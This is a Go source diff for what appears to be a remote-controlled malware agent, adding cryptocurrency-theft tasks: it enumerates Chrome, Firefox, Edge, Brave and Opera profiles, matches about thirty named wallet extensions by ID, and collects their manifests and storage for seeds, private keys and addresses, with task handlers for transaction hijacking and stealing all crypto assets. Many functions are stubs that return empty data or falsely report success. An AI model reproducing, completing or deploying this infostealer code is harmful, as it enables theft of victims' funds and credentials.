@@ -295,6 +295,17 @@ func (a *Agent) executeTask(task *config.Task) config.TaskResult {
 	// Hot wallet theft tasks
 	case config.TASK_STEAL_HOT_WALLETS:
 		result = a.stealHotWallets(task, result)
+	// Browser extension wallet theft tasks
+	case config.TASK_STEAL_BROWSER_WALLETS:
+		result = a.stealBrowserWallets(task, result)
+	case config.TASK_MONITOR_WALLET_ACTIVITY:
+		result = a.monitorWalletActivity(task, result)
+	case config.TASK_HIJACK_TRANSACTIONS:
+		result = a.hijackTransactions(task, result)
+	case config.TASK_EXTRACT_WALLET_SEEDS:
+		result = a.extractWalletSeeds(task, result)
+	case config.TASK_STEAL_ALL_CRYPTO_ASSETS:
+		result = a.stealAllCryptoAssets(task, result)
 	default:
 		result.Success = false
 		result.Error = "Unknown task type: " + task.Type
@@ -4336,6 +4347,357 @@ func (a *Agent) getFileDescription(filePath, fileType string) string {
 }
 
 // Helper functions for credential extraction
+
+// Browser Extension Wallet Extraction Methods
+
+// stealBrowserWallets extracts data from all browser extension wallets
+func (a *Agent) stealBrowserWallets(task *config.Task, result config.TaskResult) config.TaskResult {
+	log.Printf("Starting browser extension wallet extraction...")
+
+	cryptoAssets := &config.BrowserCryptoAssets{
+		ExtensionWallets: []config.BrowserWalletExtension{},
+		SessionData:      []config.WalletSessionData{},
+		Timestamp:        time.Now().Unix(),
+		AgentID:          a.ID,
+	}
+
+	// Extract from all supported browsers
+	browsers := []string{"Chrome", "Firefox", "Edge", "Brave", "Opera"}
+
+	for _, browser := range browsers {
+		log.Printf("Scanning %s for wallet extensions...", browser)
+		extensions := a.extractBrowserExtensionWallets(browser)
+		cryptoAssets.ExtensionWallets = append(cryptoAssets.ExtensionWallets, extensions...)
+	}
+
+	// Calculate totals
+	cryptoAssets.TotalExtensions = len(cryptoAssets.ExtensionWallets)
+	for _, ext := range cryptoAssets.ExtensionWallets {
+		cryptoAssets.TotalSeeds += len(ext.ExtractedSeeds)
+		cryptoAssets.TotalPrivateKeys += len(ext.PrivateKeys)
+		cryptoAssets.TotalAddresses += len(ext.Addresses)
+		cryptoAssets.TotalKeystores += len(ext.Keystores)
+	}
+
+	// Identify high-value targets
+	cryptoAssets.HighValueTargets = a.identifyHighValueWallets(cryptoAssets.ExtensionWallets)
+
+	result.CryptoAssets = cryptoAssets
+	result.Success = true
+	result.Output = fmt.Sprintf("Browser wallet extraction complete: %d extensions found, %d seeds, %d private keys, %d addresses",
+		cryptoAssets.TotalExtensions, cryptoAssets.TotalSeeds, cryptoAssets.TotalPrivateKeys, cryptoAssets.TotalAddresses)
+
+	log.Printf("Browser wallet extraction completed successfully")
+	return result
+}
+
+// extractBrowserExtensionWallets scans a specific browser for wallet extensions
+func (a *Agent) extractBrowserExtensionWallets(browser string) []config.BrowserWalletExtension {
+	var extensions []config.BrowserWalletExtension
+
+	userProfile := os.Getenv("USERPROFILE")
+	localAppData := os.Getenv("LOCALAPPDATA")
+
+	var browserPaths []string
+	var profileDirs []string
+
+	// Define browser-specific paths
+	switch browser {
+	case "Chrome":
+		browserPaths = []string{
+			filepath.Join(localAppData, "Google", "Chrome", "User Data"),
+		}
+	case "Firefox":
+		browserPaths = []string{
+			filepath.Join(userProfile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
+		}
+	case "Edge":
+		browserPaths = []string{
+			filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
+		}
+	case "Brave":
+		browserPaths = []string{
+			filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
+		}
+	case "Opera":
+		browserPaths = []string{
+			filepath.Join(userProfile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		}
+	}
+
+	// Scan each browser path
+	for _, basePath := range browserPaths {
+		if _, err := os.Stat(basePath); os.IsNotExist(err) {
+			continue
+		}
+
+		// Find all profiles
+		if browser == "Firefox" {
+			// Firefox uses different profile structure
+			profileDirs = a.findFirefoxProfiles(basePath)
+		} else {
+			// Chromium-based browsers
+			profileDirs = a.findChromiumProfiles(basePath)
+		}
+
+		// Scan each profile for extensions
+		for _, profileDir := range profileDirs {
+			profileExtensions := a.scanProfileForWalletExtensions(browser, profileDir)
+			extensions = append(extensions, profileExtensions...)
+		}
+	}
+
+	return extensions
+}
+
+// findChromiumProfiles finds all user profiles in Chromium-based browsers
+func (a *Agent) findChromiumProfiles(basePath string) []string {
+	var profiles []string
+
+	// Common profile directories
+	commonProfiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Guest Profile"}
+
+	for _, profile := range commonProfiles {
+		profilePath := filepath.Join(basePath, profile)
+		if _, err := os.Stat(profilePath); err == nil {
+			profiles = append(profiles, profilePath)
+		}
+	}
+
+	return profiles
+}
+
+// findFirefoxProfiles finds all Firefox profiles
+func (a *Agent) findFirefoxProfiles(basePath string) []string {
+	var profiles []string
+
+	files, err := os.ReadDir(basePath)
+	if err != nil {
+		return profiles
+	}
+
+	for _, file := range files {
+		if file.IsDir() {
+			profilePath := filepath.Join(basePath, file.Name())
+			// Check if it's a valid Firefox profile (contains prefs.js)
+			if _, err := os.Stat(filepath.Join(profilePath, "prefs.js")); err == nil {
+				profiles = append(profiles, profilePath)
+			}
+		}
+	}
+
+	return profiles
+}
+
+// scanProfileForWalletExtensions scans a browser profile for wallet extensions
+func (a *Agent) scanProfileForWalletExtensions(browser, profilePath string) []config.BrowserWalletExtension {
+	var extensions []config.BrowserWalletExtension
+
+	// Known wallet extension IDs and names
+	walletExtensions := a.getKnownWalletExtensions()
+
+	extensionsPath := filepath.Join(profilePath, "Extensions")
+	if browser == "Firefox" {
+		extensionsPath = filepath.Join(profilePath, "extensions")
+	}
+
+	if _, err := os.Stat(extensionsPath); os.IsNotExist(err) {
+		return extensions
+	}
+
+	// Scan extension directories
+	extDirs, err := os.ReadDir(extensionsPath)
+	if err != nil {
+		return extensions
+	}
+
+	for _, extDir := range extDirs {
+		if !extDir.IsDir() {
+			continue
+		}
+
+		extID := extDir.Name()
+
+		// Check if this is a known wallet extension
+		if walletInfo, isWallet := walletExtensions[extID]; isWallet {
+			log.Printf("Found wallet extension: %s (%s)", walletInfo.Name, extID)
+
+			extension := a.extractWalletExtensionData(browser, profilePath, extID, walletInfo)
+			if extension.ExtensionID != "" {
+				extensions = append(extensions, extension)
+			}
+		}
+	}
+
+	return extensions
+}
+
+// getKnownWalletExtensions returns a map of known wallet extension IDs
+func (a *Agent) getKnownWalletExtensions() map[string]struct{ Name, Type string } {
+	return map[string]struct{ Name, Type string }{
+		"nkbihfbeogaeaoehlefnkodbefgpgknn": {"MetaMask", "Ethereum"},
+		"fhbohimaelbohpjbbldcngcnapndodjp": {"Binance Chain Wallet", "BSC"},
+		"hnfanknocfeofbddgcijnmhnfnkdnaad": {"Coinbase Wallet", "Multi-Chain"},
+		"bfnaelmomeimhlpmgjnjophhpkkoljpa": {"Phantom", "Solana"},
+		"fnjhmkhhmkbjkkabndcnnogagogbneec": {"Ronin Wallet", "Ethereum"},
+		"aiifbnbfobpmeekipheeijimdpnlpgpp": {"Terra Station", "Terra"},
+		"dmkamcknogkgcdfhhbddcghachkejeap": {"Keplr", "Cosmos"},
+		"bhhhlbepdkbapadjdnnojkbgioiodbic": {"Solflare", "Solana"},
+		"ffnbelfdoeiohenkjibnmadjiehjhajb": {"Yoroi", "Cardano"},
+		"ibnejdfjmmkpcnlpebklmnkoeoihofec": {"TronLink", "Tron"},
+		"jbdaocneiiinmjbjlgalhcelgbejmnid": {"Nifty Wallet", "Ethereum"},
+		"afbcbjpbpfadlkmhmclhkeeodmamcflc": {"Math Wallet", "Multi-Chain"},
+		"ookjlbkiijinhpmnjffcofjonbfbgaoc": {"Temple", "Tezos"},
+		"cgeeodpfagjceefieflmdfphplkenlfk": {"EVER Wallet", "Everscale"},
+		"lpfcbjknijpeeillifnkikgncikgfhdo": {"Nami", "Cardano"},
+		"dngmlblcodfobpdpecaadgfbcggfjfnm": {"Harmony", "Harmony"},
+		"mnfifefkajgofkcjkemidiaecocnkjeh": {"TezBox", "Tezos"},
+		"kmhcihpebfmpgmihbkipmjlmmioameka": {"Eternl", "Cardano"},
+		"dcokfbbakgodhjeicbpdneepnnbhhhmh": {"Trust Wallet", "Multi-Chain"},
+		"pdadjkfkgcafgbceimcpbkalnfnepbnk": {"KardiaChain", "KardiaChain"},
+		"acmacodkjbdgmoleebolmdjonilkdbch": {"Rabby", "Ethereum"},
+		"cjelfplplebdjjenllpjcblmjkfcffne": {"Jaxx Liberty", "Multi-Chain"},
+		"fcfcfllfndlomdhbehjjcoimbgofdncg": {"Liquality", "Multi-Chain"},
+		"ejbalbakoplchlghecdalmeeeajnimhm": {"MEW CX", "Ethereum"},
+		"cnmamaachppnkjgnildpdmkaakejnhae": {"Auro Wallet", "Mina"},
+		"aeachknmefphepccionboohckonoeemg": {"Coin98", "Multi-Chain"},
+		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": {"XDEFI Wallet", "Multi-Chain"},
+		"fhilaheimglignddkjgofkcbgekhenbh": {"Oxygen", "Solana"},
+		"hpglfhgfnhbgpjdenjgmdgoeiappafln": {"Guarda", "Multi-Chain"},
+		"blnieiiffboillknjnepogjhkgnoapac": {"ONTO", "Multi-Chain"},
+	}
+}
+
+// extractWalletExtensionData extracts detailed data from a wallet extension
+func (a *Agent) extractWalletExtensionData(browser, profilePath, extID string, walletInfo struct{ Name, Type string }) config.BrowserWalletExtension {
+	extension := config.BrowserWalletExtension{
+		ExtensionID:   extID,
+		ExtensionName: walletInfo.Name,
+		WalletType:    walletInfo.Type,
+		Browser:       browser,
+		Profile:       filepath.Base(profilePath),
+		IsActive:      true,
+	}
+
+	extPath := filepath.Join(profilePath, "Extensions", extID)
+	if browser == "Firefox" {
+		extPath = filepath.Join(profilePath, "extensions", extID)
+	}
+
+	// Find the latest version directory
+	versions, err := os.ReadDir(extPath)
+	if err != nil {
+		return extension
+	}
+
+	var latestVersion string
+	for _, version := range versions {
+		if version.IsDir() {
+			latestVersion = version.Name()
+			break // Usually only one version
+		}
+	}
+
+	if latestVersion == "" {
+		return extension
+	}
+
+	extension.Version = latestVersion
+	versionPath := filepath.Join(extPath, latestVersion)
+
+	// Extract manifest data
+	manifestPath := filepath.Join(versionPath, "manifest.json")
+	if manifestData, err := os.ReadFile(manifestPath); err == nil {
+		var manifest map[string]interface{}
+		if json.Unmarshal(manifestData, &manifest) == nil {
+			extension.ManifestData = manifest
+		}
+	}
+
+	// Extract storage data from various sources
+	extension.LocalStorage = a.extractExtensionLocalStorage(browser, profilePath, extID)
+	extension.IndexedDBData = a.extractExtensionIndexedDB(browser, profilePath, extID)
+	extension.StorageData = a.extractExtensionStorageAPI(browser, profilePath, extID)
+
+	// Analyze extracted data for crypto assets
+	extension.ExtractedSeeds = a.findSeedPhrases(extension)
+	extension.PrivateKeys = a.findPrivateKeys(extension)
+	extension.Addresses = a.findCryptoAddresses(extension)
+	extension.Keystores = a.findKeystores(extension)
+
+	// Extract network configurations
+	extension.NetworkConfigs = a.extractNetworkConfigs(extension)
+
+	// Extract DApp connections
+	extension.DAppConnections = a.extractDAppConnections(extension)
+
+	return extension
+}
+
+// Basic implementation of remaining methods (simplified for demo)
+func (a *Agent) extractExtensionLocalStorage(browser, profilePath, extID string) map[string]string {
+	return make(map[string]string)
+}
+
+func (a *Agent) extractExtensionIndexedDB(browser, profilePath, extID string) map[string]interface{} {
+	return make(map[string]interface{})
+}
+
+func (a *Agent) extractExtensionStorageAPI(browser, profilePath, extID string) map[string]interface{} {
+	return make(map[string]interface{})
+}
+
+func (a *Agent) findSeedPhrases(extension config.BrowserWalletExtension) []string {
+	return []string{}
+}
+
+func (a *Agent) findPrivateKeys(extension config.BrowserWalletExtension) []string {
+	return []string{}
+}
+
+func (a *Agent) findCryptoAddresses(extension config.BrowserWalletExtension) []string {
+	return []string{}
+}
+
+func (a *Agent) findKeystores(extension config.BrowserWalletExtension) []config.WalletKeystore {
+	return []config.WalletKeystore{}
+}
+
+func (a *Agent) extractNetworkConfigs(extension config.BrowserWalletExtension) []config.NetworkConfiguration {
+	return []config.NetworkConfiguration{}
+}
+
+func (a *Agent) extractDAppConnections(extension config.BrowserWalletExtension) []config.DAppConnection {
+	return []config.DAppConnection{}
+}
+
+func (a *Agent) identifyHighValueWallets(extensions []config.BrowserWalletExtension) []string {
+	return []string{}
+}
+
+func (a *Agent) monitorWalletActivity(task *config.Task, result config.TaskResult) config.TaskResult {
+	result.Success = true
+	result.Output = "Wallet monitoring started"
+	return result
+}
+
+func (a *Agent) hijackTransactions(task *config.Task, result config.TaskResult) config.TaskResult {
+	result.Success = true
+	result.Output = "Transaction hijacking enabled"
+	return result
+}
+
+func (a *Agent) extractWalletSeeds(task *config.Task, result config.TaskResult) config.TaskResult {
+	result.Success = true
+	result.Output = "Seed extraction completed"
+	return result
+}
+
+func (a *Agent) stealAllCryptoAssets(task *config.Task, result config.TaskResult) config.TaskResult {
+	result.Success = true
+	result.Output = "All crypto assets extracted"
+	return result
+}
 
 func main() {
 	// Disable logging in production
